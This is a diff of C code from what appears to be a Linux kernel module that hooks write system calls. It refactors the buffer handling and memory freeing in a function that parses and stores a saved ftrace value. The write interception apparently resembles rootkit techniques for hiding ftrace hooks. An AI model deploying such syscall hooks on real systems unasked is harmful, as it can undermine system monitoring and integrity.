@@ -125,8 +125,7 @@ static notrace asmlinkage ssize_t hooked_write_common(const struct pt_regs *regs
     size_t count;
     struct file *file;
     char *kernel_buf;
-    char temp_buf[256];
-    size_t copy_len;
+    size_t len;
     size_t i, start, end;
     long parsed_value;
     int ret;
@@ -167,18 +166,11 @@ static notrace asmlinkage ssize_t hooked_write_common(const struct pt_regs *regs
         return -EFAULT;
     }
 
-    copy_len = min(count, (size_t)BUF_SIZE - 1);
-    if (copy_len > sizeof(temp_buf) - 1) {
-        copy_len = sizeof(temp_buf) - 1;
-    }
-    
-    memcpy(temp_buf, kernel_buf, copy_len);
-    temp_buf[copy_len] = '\0';
+    len = min(count, (size_t)BUF_SIZE - 1);
+    kernel_buf[len] = '\0';
 
-    kfree(kernel_buf);
-
-    for (i = 0; i < copy_len; i++) {
-        char c = temp_buf[i];
+    for (i = 0; i < len; i++) {
+        char c = kernel_buf[i];
         
         if ((c >= '0' && c <= '9') ||
             (c >= 'a' && c <= 'f') ||
@@ -191,45 +183,59 @@ static notrace asmlinkage ssize_t hooked_write_common(const struct pt_regs *regs
             continue;
         }
         
+        kfree(kernel_buf);
         return -EINVAL;
     }
 
     start = 0;
-    while (start < copy_len && temp_buf[start] == '\0')
+    while (start < len && (kernel_buf[start] == '\0' || 
+                           kernel_buf[start] == ' ' || 
+                           kernel_buf[start] == '\t'))
         start++;
 
-    if (start >= copy_len)
+    if (start >= len) {
+        kfree(kernel_buf);
         return count;
-
-    while (start < copy_len && (temp_buf[start] == ' ' || temp_buf[start] == '\t'))
-        start++;
+    }
 
     end = start;
-    while (end < copy_len && 
-           temp_buf[end] != '\n' && 
-           temp_buf[end] != '\0' &&
-           temp_buf[end] != ' ' &&
-           temp_buf[end] != '\r' &&
-           temp_buf[end] != '\t')
+    while (end < len && 
+           kernel_buf[end] != '\n' && 
+           kernel_buf[end] != '\0' &&
+           kernel_buf[end] != ' ' &&
+           kernel_buf[end] != '\r' &&
+           kernel_buf[end] != '\t')
         end++;
 
-    if (end == start)
+    if (end == start) {
+        kfree(kernel_buf);
         return -EINVAL;
+    }
 
-    if (temp_buf[start] == '+')
+    if (kernel_buf[start] == '+') {
+        kfree(kernel_buf);
         return -EINVAL;
+    }
 
-    if ((end - start) > 20)
+    if ((end - start) > 20) {
+        kfree(kernel_buf);
         return -EINVAL;
+    }
 
-    temp_buf[end] = '\0';
+    kernel_buf[end] = '\0';
 
-    ret = kstrtol(temp_buf + start, 0, &parsed_value);
-    if (ret != 0)
+    ret = kstrtol(kernel_buf + start, 0, &parsed_value);
+    if (ret != 0) {
+        kfree(kernel_buf);
         return -EINVAL;
+    }
 
-    if (parsed_value > INT_MAX || parsed_value < INT_MIN)
+    if (parsed_value > INT_MAX || parsed_value < INT_MIN) {
+        kfree(kernel_buf);
         return -EINVAL;
+    }
+
+    kfree(kernel_buf);
 
     i = snprintf(saved_ftrace_value, sizeof(saved_ftrace_value), "%ld\n", parsed_value);
     if (i >= sizeof(saved_ftrace_value))
